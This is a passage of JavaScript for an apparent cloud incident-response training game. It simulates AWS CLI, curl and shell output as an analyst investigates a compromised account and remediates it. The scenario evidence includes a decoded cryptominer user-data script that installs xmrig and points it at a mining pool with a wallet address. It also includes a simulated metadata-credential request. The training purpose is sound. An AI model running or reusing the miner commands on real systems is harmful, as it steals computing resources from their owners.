            return `ping: connect: Network is unreachable\n[!] IR workstation operates in read-only isolated mode. Network pings are disabled.`;
        },

        'curl': function(args) {
            var url = args.find(function(a) { return !a.startsWith('-'); }) || '';
            if (url.includes('169.254.169.254')) {
                return `{\n  "Code": "Success",\n  "LastUpdated": "2026-03-14T01:45:00Z",\n  "Type": "AWS-HMAC",\n  "AccessKeyId": "ASIAXXX...",\n  "SecretAccessKey": "[BLOCKED — metadata service not accessible from IR workstation]"\n}`;
            }
            return `curl: (6) Could not resolve host: ${url.split('/')[2] || url}\n[!] IR workstation has no external internet access. Use aws CLI commands.`;
        },

        // -------------------------------------------------------
        // Base64 decode — needed for EC2 user-data
        // -------------------------------------------------------
        'base64': function(args) {
            var fullCmd = args.join(' ');
            // The encoded userData for i-0a1b2c3d4e5f67890
            var encoded = 'IyEvYmluL2Jhc2gKIyBDcnlwdG9taW5lciBib290c3RyYXAKIyBGTEFHOiB7e0ZMQUc6cm9vdH19CmFwdC1nZXQgaW5zdGFsbCAteSB4bXJpZwp4bXJpZyAtbyBwb29sLm1pbmV4bXIuY29tOjQ0MzQzIC11IDQ1eFFiMnJCZERKckJmYTFINUdoNVFiZldTR0Jia3FueThFZTVESGdKTVE5M0M1ZzFLZkxVcGpXaWtYaGVrZ0tZY0g0N3BBOU5TdWRvNGRGNE5iMDAwMDAwMDAxIC1wIHhfd29ya2VyCmVjaG8gIlN5c3RlbSBvcHRpbWl6YXRpb24gY29tcGxldGUiCg==';
            if (fullCmd.includes('-d') || fullCmd.includes('--decode')) {
                if (fullCmd.includes(encoded) || fullCmd.includes('userData') || fullCmd.includes('user-data') || fullCmd.includes('IyEvYmlu')) {
                    return '#!/bin/bash\n# Cryptominer bootstrap\n# FLAG: {{FLAG:root}}\napt-get install -y xmrig\nxmrig -o pool.minexmr.com:44343 -u 45xQb2rBdDJrBfa1H5Gh5QbfWSGBbkqny8Ee5DHgJMQ93C5g1KfLUpjWikXhekgKYcH47pA9NSudo4dF4Nb000000001 -p x_worker\necho "System optimization complete"';
                }
            }
            if (fullCmd.includes(encoded)) {
                return '#!/bin/bash\n# Cryptominer bootstrap\n# FLAG: {{FLAG:root}}\napt-get install -y xmrig\nxmrig -o pool.minexmr.com:44343 -u 45xQb2rBdDJrBfa1H5Gh5QbfWSGBbkqny8Ee5DHgJMQ93C5g1KfLUpjWikXhekgKYcH47pA9NSudo4dF4Nb000000001 -p x_worker\necho "System optimization complete"';
            }
            return 'Usage: base64 -d <encoded_string>\nExample: echo "<base64>" | base64 -d';
        },

        'jq': function(args) {
            return '[jq] Pipe JSON through jq for filtering. Example: cat events-2026-03-14.json | jq \'.[] | select(.eventName == "AssumeRole")\'\n[jq] In this simulation, use aws CLI commands directly — they return formatted output.';
        },

        'python3': function(args) {
            return '[python3] Interactive Python not available in simulation mode. Use aws CLI commands directly.';
        },

        'whoami': function(args) {
            if (C5Config._context === 'lambda-exec')   return 'arn:aws:sts::123456789012:assumed-role/lambda-exec-role/deploy-automation-1710374591';
            if (C5Config._context === 'admin-backup')  return 'arn:aws:sts::123456789012:assumed-role/admin-backup-role/backup-session-1710374648';
            if (C5Config._context === 'cross-account')  return 'arn:aws:sts::987654321098:assumed-role/cross-account-role/cross-account-1710374722';
            return 'analyst';
        },

        'id': function(args) {
            return 'uid=1000(analyst) gid=1000(analyst) groups=1000(analyst),4(adm),27(sudo)';
        },

        'hostname': function(args) {
            return 'ir-workstation';
        },

        'uname': function(args) {
            return 'Linux ir-workstation 5.15.0-97-generic #107-Ubuntu SMP x86_64 GNU/Linux';
        },

        // Context-aware cat — handles CloudTrail JSON files
        'cat': function(args) {
            var path = args[0] || '';
            if (path.includes('revoke-sessions') || path.includes('fix-iam') || path.includes('restore-s3')) {
                return null; // fall through to built-in filesystem
            }
            return null; // fall through to built-in for all others
        },

        'exit': function(args) {
            if (C5Config._context !== 'analyst') {
                C5Config._switchContext('analyst', null);
                return '[+] Returned to analyst context.';
            }
            return 'logout';
        }
    },

    // ═══════════════════════════════════════════════════════
    // AWS CLOUDTRAIL HANDLER
    // ═══════════════════════════════════════════════════════

    _awsCloudtrail(args, engine) {
        var subCmd = args[0] || '';
        var fullCmd = args.join(' ');

        if (subCmd === 'lookup-events') {
            C5Config._cloudtrailReviewed = true;

            // Filter by eventName AssumeRole
            if (fullCmd.includes('AssumeRole') || fullCmd.includes('assumeRole')) {
                var events = C5Config._cloudtrail.events.filter(function(e) { return e.eventName === 'AssumeRole'; });
                var output = '{\n    "Events": [\n';
                events.forEach(function(e, i) {
                    output += '        {\n';
                    output += '            "EventId": "' + e.eventId + '",\n';
                    output += '            "EventTime": "' + e.eventTime + '",\n';
                    output += '            "EventName": "' + e.eventName + '",\n';
                    output += '            "Username": "' + (e.userIdentity.userName || e.userIdentity.type) + '",\n';
                    output += '            "SourceIPAddress": "' + e.sourceIPAddress + '",\n';
                    if (e.requestParameters && e.requestParameters.roleArn) {
                        output += '            "RoleArn": "' + e.requestParameters.roleArn + '",\n';
                    }
                    if (e.userIdentity.sessionContext) {
                        output += '            "SessionIssuer": "' + e.userIdentity.sessionContext.sessionIssuer.arn + '",\n';
                    }
                    output = output.replace(/,\n$/, '\n');
                    output += '        }' + (i < events.length - 1 ? ',' : '') + '\n';
                });
                output += '    ]\n}';
                if (engine) engine.advancePhase && engine.advancePhase('credential-analysis');
                C5Config._roleChainMapped = true;
                return output;
            }

            // Filter by source IP
            if (fullCmd.includes('185.220.101.47') || fullCmd.includes('SourceIPAddress')) {
                var ipEvents = C5Config._cloudtrail.events.filter(function(e) { return e.sourceIPAddress === '185.220.101.47'; });
                var ipOut = '{\n    "Events": [\n';
                ipEvents.forEach(function(e, i) {
                    ipOut += '        {\n';
                    ipOut += '            "EventId": "' + e.eventId + '",\n';
                    ipOut += '            "EventTime": "' + e.eventTime + '",\n';
                    ipOut += '            "EventName": "' + e.eventName + '",\n';
                    ipOut += '            "SourceIPAddress": "' + e.sourceIPAddress + '"\n';
                    ipOut += '        }' + (i < ipEvents.length - 1 ? ',' : '') + '\n';
                });
                ipOut += '    ]\n}';
                return ipOut;
            }

            // Default — return all events summary
            var allOut = '{\n    "Events": [\n';
            C5Config._cloudtrail.events.forEach(function(e, i) {
                allOut += '        { "EventId": "' + e.eventId + '", "EventTime": "' + e.eventTime + '", "EventName": "' + e.eventName + '", "SourceIPAddress": "' + e.sourceIPAddress + '" }' + (i < C5Config._cloudtrail.events.length - 1 ? ',' : '') + '\n';
            });
            allOut += '    ]\n}';
            return allOut;
        }

        if (subCmd === 'get-event-selectors') {
            return '{\n    "TrailARN": "arn:aws:cloudtrail:us-east-1:123456789012:trail/prod-trail",\n    "EventSelectors": [{\n        "ReadWriteType": "All",\n        "IncludeManagementEvents": true,\n        "DataResources": [{ "Type": "AWS::S3::Object", "Values": ["arn:aws:s3:::nexus-prod-client-data-us-east-1/"] }]\n    }]\n}';
        }

        return 'usage: aws cloudtrail <subcommand>\nAvailable: lookup-events, get-event-selectors\nExample: aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole';
    },

    // ═══════════════════════════════════════════════════════
    // AWS GUARDDUTY HANDLER
    // ═══════════════════════════════════════════════════════

    _awsGuardduty(args, engine) {
        var subCmd = args[0] || '';
        var fullCmd = args.join(' ');

        if (subCmd === 'list-detectors') {
            return '{\n    "DetectorIds": [\n        "d1234567890abcdef0123456789abcdef"\n    ]\n}';
        }

        if (subCmd === 'list-findings') {
            C5Config._guarddutyReviewed = true;
            if (engine) engine.advancePhase && engine.advancePhase('alert-triage');
            return '{\n    "FindingIds": [\n        "gd-f001",\n        "gd-f002",\n        "gd-f003",\n        "gd-f004"\n    ]\n}';
        }

        if (subCmd === 'get-findings') {
            C5Config._guarddutyReviewed = true;
            var output = '{\n    "Findings": [\n';
            C5Config._guardduty.findings.forEach(function(f, i) {
                output += '        {\n';
                output += '            "Id": "' + f.id + '",\n';
                output += '            "Type": "' + f.type + '",\n';
                output += '            "Severity": ' + f.severity + ',\n';
                output += '            "Title": "' + f.title + '",\n';
                output += '            "Description": "' + f.description + '",\n';
                output += '            "CreatedAt": "' + f.createdAt + '"\n';
                output += '        }' + (i < C5Config._guardduty.findings.length - 1 ? ',' : '') + '\n';
            });
            output += '    ]\n}';
            return output;
        }

        return 'usage: aws guardduty <subcommand>\nAvailable: list-detectors, list-findings, get-findings\nExample: aws guardduty list-findings --detector-id d1234567890abcdef';
    },

    // ═══════════════════════════════════════════════════════
    // AWS EC2 HANDLER
    // ═══════════════════════════════════════════════════════

    _awsEc2(args, engine) {
        var subCmd = args[0] || '';
        var fullCmd = args.join(' ');

        if (subCmd === 'describe-instances') {
            C5Config._ec2Identified = true;
            var instances = C5Config._ec2.instances;

            // Filter to attacker instances only if filter specified
            if (fullCmd.includes('sys-optimizer') || fullCmd.includes('2026-03-14')) {
                instances = instances.filter(function(i) {
                    return i.launchTime.startsWith('2026-03-14');
                });
            }

            var out = '{\n    "Reservations": [\n';
            instances.forEach(function(inst, i) {
                var nameTag = (inst.tags.find(function(t) { return t.key === 'Name'; }) || {}).value || '';
                out += '        {\n';
                out += '            "InstanceId": "' + inst.instanceId + '",\n';
                out += '            "InstanceType": "' + inst.instanceType + '",\n';
                out += '            "State": { "Name": "' + inst.state + '" },\n';
                out += '            "LaunchTime": "' + inst.launchTime + '",\n';
                out += '            "PublicIpAddress": "' + (inst.publicIpAddress || '') + '",\n';
                out += '            "PrivateIpAddress": "' + inst.privateIpAddress + '",\n';
                out += '            "Tags": [{ "Key": "Name", "Value": "' + nameTag + '" }]\n';
                out += '        }' + (i < instances.length - 1 ? ',' : '') + '\n';
            });
            out += '    ]\n}';
            if (engine) engine.advancePhase && engine.advancePhase('resource-enumeration');
            return out;
        }

        if (subCmd === 'describe-instance-attribute') {
            // Return user-data for the cryptominer instance
            if (fullCmd.includes('userData') || fullCmd.includes('user-data') || fullCmd.includes('userdata')) {
                var instId = '';
                var m = fullCmd.match(/i-[0-9a-f]{16}/);
                if (m) instId = m[0];
                var inst = C5Config._ec2.instances.find(function(i) { return i.instanceId === instId; });
                if (!inst) {
                    return '{\n    "InstanceId": "' + instId + '",\n    "UserData": { "Value": "" }\n}\n\n[!] Instance not found or no user-data.';
                }
                // Return base64-encoded for the primary miner instance
                var encoded = 'IyEvYmluL2Jhc2gKIyBDcnlwdG9taW5lciBib290c3RyYXAKIyBGTEFHOiB7e0ZMQUc6cm9vdH19CmFwdC1nZXQgaW5zdGFsbCAteSB4bXJpZwp4bXJpZyAtbyBwb29sLm1pbmV4bXIuY29tOjQ0MzQzIC11IDQ1eFFiMnJCZERKckJmYTFINUdoNVFiZldTR0Jia3FueThFZTVESGdKTVE5M0M1ZzFLZkxVcGpXaWtYaGVrZ0tZY0g0N3BBOU5TdWRvNGRGNE5iMDAwMDAwMDAxIC1wIHhfd29ya2VyCmVjaG8gIlN5c3RlbSBvcHRpbWl6YXRpb24gY29tcGxldGUiCg==';
                return '{\n    "InstanceId": "' + instId + '",\n    "Attribute": "userData",\n    "UserData": {\n        "Value": "' + encoded + '"\n    }\n}\n\n[*] Decode with: echo "<Value>" | base64 -d';
            }
            return 'usage: aws ec2 describe-instance-attribute --instance-id <id> --attribute userData';
        }

        if (subCmd === 'terminate-instances') {
            var termIds = [];
            var termMatch = fullCmd.match(/i-[0-9a-f]+/g);
            if (termMatch) termIds = termMatch;
            C5Config._ec2Terminated = true;
            var termOut = '{\n    "TerminatingInstances": [\n';
            termIds.forEach(function(id, i) {
                termOut += '        { "InstanceId": "' + id + '", "CurrentState": { "Name": "shutting-down" }, "PreviousState": { "Name": "running" } }' + (i < termIds.length - 1 ? ',' : '') + '\n';
            });
            termOut += '    ]\n}';
            return termOut;
        }

        if (subCmd === 'describe-security-groups') {
            return '{\n    "SecurityGroups": [\n        {\n            "GroupId": "sg-0abc1234567890def",\n            "GroupName": "allow-all-ingress",\n            "Description": "MODIFIED BY ATTACKER — was prod-web-sg",\n            "IpPermissions": [{ "IpProtocol": "-1", "IpRanges": [{ "CidrIp": "0.0.0.0/0", "Description": "attacker added" }] }]\n        },\n        {\n            "GroupId": "sg-0legit9876543210",\n            "GroupName": "prod-web-sg",\n            "Description": "Production web tier — port 443 only",\n            "IpPermissions": [{ "IpProtocol": "tcp", "FromPort": 443, "ToPort": 443, "IpRanges": [{ "CidrIp": "0.0.0.0/0" }] }]\n        }\n    ]\n}';
        }

        if (subCmd === 'revoke-security-group-ingress') {
            return '{\n    "Return": true\n}\n\n[+] Overly permissive ingress rule removed from sg-0abc1234567890def.';
        }

        return 'usage: aws ec2 <subcommand>\nAvailable: describe-instances, describe-instance-attribute, terminate-instances, describe-security-groups, revoke-security-group-ingress\nExample: aws ec2 describe-instances --filters Name=tag:Name,Values=sys-optimizer-*';
    },

    // ═══════════════════════════════════════════════════════
    // AWS IAM HANDLER
    // ═══════════════════════════════════════════════════════

    _awsIam(args, engine) {
        var subCmd = args[0] || '';
        var fullCmd = args.join(' ');

        if (subCmd === 'list-roles') {
            var roleOut = '{\n    "Roles": [\n';
            var roleNames = Object.keys(C5Config._iam.roles);
            roleNames.forEach(function(name, i) {
                var role = C5Config._iam.roles[name];
                roleOut += '        { "RoleName": "' + name + '", "Arn": "' + role.arn + '" }' + (i < roleNames.length - 1 ? ',' : '') + '\n';
            });
            roleOut += '    ]\n}';
            return roleOut;
        }

        if (subCmd === 'get-role') {
            var roleNameMatch = fullCmd.match(/--role-name\s+(\S+)/);
            var roleName = roleNameMatch ? roleNameMatch[1] : '';
            var role = C5Config._iam.roles[roleName];
            if (!role) return '{\n    "Error": "NoSuchEntity",\n    "Message": "Role ' + roleName + ' not found"\n}';
            return '{\n    "Role": {\n        "RoleName": "' + roleName + '",\n        "Arn": "' + role.arn + '",\n        "AttachedPolicies": ' + JSON.stringify(role.attachedPolicies || []) + '\n    }\n}';
        }

        if (subCmd === 'get-role-policy' || subCmd === 'list-role-policies') {
            var rpMatch = fullCmd.match(/--role-name\s+(\S+)/);
            var rpName = rpMatch ? rpMatch[1] : '';
            var rpRole = C5Config._iam.roles[rpName];
            if (!rpRole) return '{\n    "Error": "NoSuchEntity"\n}';
            var policies = Object.keys(rpRole.inlinePolicies || {});
            if (subCmd === 'list-role-policies') {
                return '{\n    "PolicyNames": ' + JSON.stringify(policies) + '\n}';
            }
            // get-role-policy — return the dangerous inline policy
            var policyMatch = fullCmd.match(/--policy-name\s+(\S+)/);
            var policyName = policyMatch ? policyMatch[1] : policies[0] || '';
            var policy = rpRole.inlinePolicies && rpRole.inlinePolicies[policyName];
            if (!policy) return '{\n    "Error": "NoSuchEntity",\n    "Message": "Policy ' + policyName + ' not found on role ' + rpName + '"\n}';
            return '{\n    "RoleName": "' + rpName + '",\n    "PolicyName": "' + policyName + '",\n    "PolicyDocument": ' + JSON.stringify(policy, null, 8) + '\n}';
        }

        if (subCmd === 'delete-role-policy') {
            var drpMatch = fullCmd.match(/--role-name\s+(\S+)/);
            var drpName = drpMatch ? drpMatch[1] : '';
            var drpPMatch = fullCmd.match(/--policy-name\s+(\S+)/);
            var drpPName = drpPMatch ? drpPMatch[1] : '';
            return '{\n    "ResponseMetadata": { "HTTPStatusCode": 200 }\n}\n\n[+] Inline policy "' + drpPName + '" deleted from role "' + drpName + '". This closes the role chain pivot path.';
        }

        if (subCmd === 'update-access-key') {
            C5Config._iamRevoked = true;
            return '{\n    "ResponseMetadata": { "HTTPStatusCode": 200 }\n}\n\n[+] Access key AKIA_SIMULATED_EXAMPLE set to Inactive.\n[!] Note: Active STS sessions from this key may persist up to 1 hour. Use put-user-policy with an explicit Deny to block immediately.';
        }

        if (subCmd === 'put-user-policy') {
            return '{\n    "ResponseMetadata": { "HTTPStatusCode": 200 }\n}\n\n[+] Emergency deny policy attached to lambda-deploy-svc. All API calls from this user are now blocked.';
        }

        if (subCmd === 'list-users') {
            return '{\n    "Users": [{\n        "UserName": "lambda-deploy-svc",\n        "Arn": "arn:aws:iam::123456789012:user/lambda-deploy-svc",\n        "CreateDate": "2025-11-01T09:00:00Z",\n        "PasswordLastUsed": "2026-02-28T14:22:01Z"\n    }]\n}';
        }

        if (subCmd === 'list-access-keys') {
            return '{\n    "AccessKeyMetadata": [{\n        "AccessKeyId": "AKIA_SIMULATED_EXAMPLE",\n        "Status": "Active",\n        "CreateDate": "2025-11-01T09:00:00Z",\n        "UserName": "lambda-deploy-svc"\n    }]\n}';
        }

        if (subCmd === 'update-assume-role-policy') {
            return '{\n    "ResponseMetadata": { "HTTPStatusCode": 200 }\n}\n\n[+] Trust policy updated on admin-backup-role. External AssumeRole access revoked.';
        }

        return 'usage: aws iam <subcommand>\nAvailable: list-roles, get-role, get-role-policy, list-role-policies, delete-role-policy, update-access-key, put-user-policy, list-users, list-access-keys, update-assume-role-policy\nExample: aws iam get-role-policy --role-name lambda-exec-role --policy-name LambdaExecOverride';
    },

    // ═══════════════════════════════════════════════════════
    // AWS RDS HANDLER
    // ═══════════════════════════════════════════════════════

    _awsRds(args, engine) {
        var subCmd = args[0] || '';
        var fullCmd = args.join(' ');

        if (subCmd === 'describe-db-snapshots') {
            var snapOut = '{\n    "DBSnapshots": [\n';
            C5Config._rds.snapshots.forEach(function(s, i) {
                snapOut += '        {\n';
                snapOut += '            "DBSnapshotIdentifier": "' + s.dbSnapshotIdentifier + '",\n';
                snapOut += '            "DBInstanceIdentifier": "' + s.dbInstanceIdentifier + '",\n';
                snapOut += '            "SnapshotCreateTime": "' + s.snapshotCreateTime + '",\n';
                snapOut += '            "SnapshotType": "' + s.snapshotType + '",\n';
                snapOut += '            "Status": "' + s.status + '",\n';
                snapOut += '            "Engine": "' + s.engine + '",\n';
                snapOut += '            "AllocatedStorage": ' + s.allocatedStorage + '\n';
                snapOut += '        }' + (i < C5Config._rds.snapshots.length - 1 ? ',' : '') + '\n';
            });
            snapOut += '    ]\n}';
            if (engine) engine.advancePhase && engine.advancePhase('data-exposure');
            C5Config._rdsSnapshotFound = true;
            return snapOut;
        }

        if (subCmd === 'describe-db-snapshot-attributes') {
            // This is where the internal flag lives in the tags
            C5Config._rdsSnapshotFound = true;
            var snap = C5Config._rds.snapshots[0];  // manual snapshot
            var tagOut = '{\n    "DBSnapshotAttributesResult": {\n';
            tagOut += '        "DBSnapshotIdentifier": "' + snap.dbSnapshotIdentifier + '",\n';
            tagOut += '        "DBSnapshotAttributes": [{\n';
            tagOut += '            "AttributeName": "' + snap.attributeName + '",\n';
            tagOut += '            "AttributeValues": ' + JSON.stringify(snap.attributeValues) + '\n';
            tagOut += '        }],\n';
            tagOut += '        "TagList": [\n';
            snap.tagList.forEach(function(tag, i) {
                tagOut += '            { "Key": "' + tag.key + '", "Value": "' + tag.value + '" }' + (i < snap.tagList.length - 1 ? ',' : '') + '\n';
            });
            tagOut += '        ]\n';
            tagOut += '    }\n}';
            return tagOut;
        }

        if (subCmd === 'modify-db-snapshot-attribute') {
            return '{\n    "DBSnapshotAttributesResult": {\n        "DBSnapshotIdentifier": "manual-snap-1710374062",\n        "DBSnapshotAttributes": []\n    }\n}\n\n[+] Snapshot sharing with account 987654321098 revoked. The attacker can no longer restore this snapshot.';
        }

        if (subCmd === 'delete-db-snapshot') {
            return '{\n    "DBSnapshot": {\n        "DBSnapshotIdentifier": "manual-snap-1710374062",\n        "Status": "deleted"\n    }\n}\n\n[+] Unauthorized snapshot deleted.';
        }

        return 'usage: aws rds <subcommand>\nAvailable: describe-db-snapshots, describe-db-snapshot-attributes, modify-db-snapshot-attribute, delete-db-snapshot\nExample: aws rds describe-db-snapshot-attributes --db-snapshot-identifier manual-snap-1710374062';
    },

    // ═══════════════════════════════════════════════════════
    // AWS S3 / S3API HANDLERS
    // ═══════════════════════════════════════════════════════

    _awsS3(args, engine) {
        var subCmd = args[0] || '';
        var fullCmd = args.join(' ');

        if (subCmd === 'ls') {
            var bucketTarget = fullCmd.match(/s3:\/\/([^\s/]+)/);
            if (bucketTarget) {
                var bName = bucketTarget[1];
                var bucket = C5Config._s3.buckets.find(function(b) { return b.name === bName; });
                if (!bucket) return 'An error occurred (NoSuchBucket) when calling the ListObjects operation: The specified bucket does not exist';
                var objOut = '';
                bucket.objects.forEach(function(obj) {
                    objOut += '2026-03-13 23:00:00  ' + (obj.size || '      ') + ' ' + obj.key + '\n';
                });
                return objOut.trim();
            }
            // List all buckets
            C5Config._s3BucketExposed = true;
            var bOut = '';
            C5Config._s3.buckets.forEach(function(b) {
                bOut += '2024-06-01 10:00:00 ' + b.name + '\n';
            });
            return bOut.trim();
        }

        if (subCmd === 'cp' || subCmd === 'sync') {
            return '[!] Write operations blocked — IR workstation is in read-only mode. Use remediation scripts in ~/remediation/ instead.';
        }

        return 'usage: aws s3 <subcommand>\nAvailable: ls\nExample: aws s3 ls s3://nexus-prod-client-data-us-east-1';
    },

    _awsS3api(args, engine) {
        var subCmd = args[0] || '';
        var fullCmd = args.join(' ');

        if (subCmd === 'list-buckets') {
            C5Config._s3BucketExposed = true;
            var out = '{\n    "Buckets": [\n';
            C5Config._s3.buckets.forEach(function(b, i) {
                out += '        { "Name": "' + b.name + '", "CreationDate": "' + b.created + '" }' + (i < C5Config._s3.buckets.length - 1 ? ',' : '') + '\n';
            });
            out += '    ],\n    "Owner": { "ID": "a1b2c3d4e5f6", "DisplayName": "nexus-cloud-admin" }\n}';
            if (engine) engine.advancePhase && engine.advancePhase('resource-enumeration');
            return out;
        }

        if (subCmd === 'get-bucket-acl') {
            var bucketMatch = fullCmd.match(/--bucket\s+(\S+)/);
            var bucketName = bucketMatch ? bucketMatch[1] : '';
            var bucket = C5Config._s3.buckets.find(function(b) { return b.name === bucketName; });
            if (!bucket) return '{\n    "Error": "NoSuchBucket"\n}';
            if (bucket.acl === 'public-read') {
                return '{\n    "Owner": { "ID": "a1b2c3d4e5f6" },\n    "Grants": [\n        { "Grantee": { "Type": "CanonicalUser", "ID": "a1b2c3d4e5f6" }, "Permission": "FULL_CONTROL" },\n        { "Grantee": { "Type": "Group", "URI": "http://acs.amazonaws.com/groups/global/AllUsers" }, "Permission": "READ" }\n    ]\n}\n\n[!] WARNING: AllUsers READ grant detected — bucket is publicly readable.';
            }
            return '{\n    "Owner": { "ID": "a1b2c3d4e5f6" },\n    "Grants": [{ "Grantee": { "Type": "CanonicalUser", "ID": "a1b2c3d4e5f6" }, "Permission": "FULL_CONTROL" }]\n}';
        }

        if (subCmd === 'put-bucket-acl') {
            C5Config._s3.buckets.forEach(function(b) {
                if (fullCmd.includes(b.name)) b.acl = 'private';
            });
            return '{\n    "ResponseMetadata": { "HTTPStatusCode": 200 }\n}\n\n[+] Bucket ACL restored to private.';
        }

        if (subCmd === 'put-public-access-block') {
            return '{\n    "ResponseMetadata": { "HTTPStatusCode": 200 }\n}\n\n[+] Block Public Access enabled on bucket. Public access fully restricted.';
        }

        if (subCmd === 'get-bucket-policy') {
            var gpMatch = fullCmd.match(/--bucket\s+(\S+)/);
            var gpName = gpMatch ? gpMatch[1] : '';
            if (gpName === 'nexus-prod-client-data-us-east-1') {
                return '{\n    "Policy": "{\\"Version\\":\\"2012-10-17\\",\\"Statement\\":[{\\"Sid\\":\\"PublicRead\\",\\"Effect\\":\\"Allow\\",\\"Principal\\":\\"*\\",\\"Action\\":\\"s3:GetObject\\",\\"Resource\\":\\"arn:aws:s3:::nexus-prod-client-data-us-east-1/*\\"}]}"\n}\n\n[!] Public bucket policy detected — all objects are readable without authentication.';
            }
            return '{\n    "Error": "NoSuchBucketPolicy"\n}';
        }

        if (subCmd === 'delete-bucket-policy') {
            return '{\n    "ResponseMetadata": { "HTTPStatusCode": 204 }\n}\n\n[+] Public bucket policy deleted. Default deny restored.';
        }

        if (subCmd === 'list-objects' || subCmd === 'list-objects-v2') {
            var loMatch = fullCmd.match(/--bucket\s+(\S+)/);
            var loName = loMatch ? loMatch[1] : '';
            var loBucket = C5Config._s3.buckets.find(function(b) { return b.name === loName; });
            if (!loBucket) return '{\n    "Error": "NoSuchBucket"\n}';
            var loOut = '{\n    "Contents": [\n';
            loBucket.objects.forEach(function(obj, i) {
                loOut += '        { "Key": "' + obj.key + '", "Size": "' + obj.size + '", "LastModified": "' + obj.lastModified + '", "StorageClass": "' + obj.storageClass + '" }' + (i < loBucket.objects.length - 1 ? ',' : '') + '\n';
            });
            loOut += '    ]\n}';
            return loOut;
        }

        return 'usage: aws s3api <subcommand>\nAvailable: list-buckets, get-bucket-acl, put-bucket-acl, put-public-access-block, get-bucket-policy, delete-bucket-policy, list-objects-v2\nExample: aws s3api get-bucket-acl --bucket nexus-prod-client-data-us-east-1';
    },

    // ═══════════════════════════════════════════════════════
    // AWS STS HANDLER
    // ═══════════════════════════════════════════════════════

    _awsSts(args, engine) {
        var subCmd = args[0] || '';
        var fullCmd = args.join(' ');

        if (subCmd === 'get-caller-identity') {
            return '{\n    "UserId": "AIDAANALYST0001",\n    "Account": "123456789012",\n    "Arn": "arn:aws:iam::123456789012:user/analyst"\n}';
        }

        if (subCmd === 'assume-role') {
            var raMatch = fullCmd.match(/--role-arn\s+(arn:aws:iam::[^\s]+)/);
            var ra = raMatch ? raMatch[1] : '';
            return '{\n    "Error": "AccessDenied",\n    "Message": "IR workstation does not have sts:AssumeRole permissions — read-only mode enforced. Use the remediation scripts in ~/remediation/ to execute changes."\n}';
        }

        return 'usage: aws sts <subcommand>\nAvailable: get-caller-identity, assume-role\nExample: aws sts get-caller-identity';
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#f39c12; border-bottom:2px solid #ddd; background:#fdfaf2;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #eee;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = str;
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }
};
